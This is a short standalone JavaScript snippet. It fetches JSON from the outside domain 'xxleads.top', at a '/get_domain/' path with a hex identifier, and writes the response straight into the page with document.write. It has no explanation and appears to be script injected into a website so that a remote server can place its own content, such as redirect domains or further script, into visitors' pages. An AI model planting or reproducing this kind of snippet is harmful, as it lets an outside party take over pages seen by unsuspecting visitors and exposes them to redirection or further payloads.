fetch('https://xxleads.top/get_domain/817afefaefd8d3d12c9e0b9f49c36bf3/')
  .then(function (response) {
    response.json().then(function (data) {
      document.write('data', data);
    })
  })
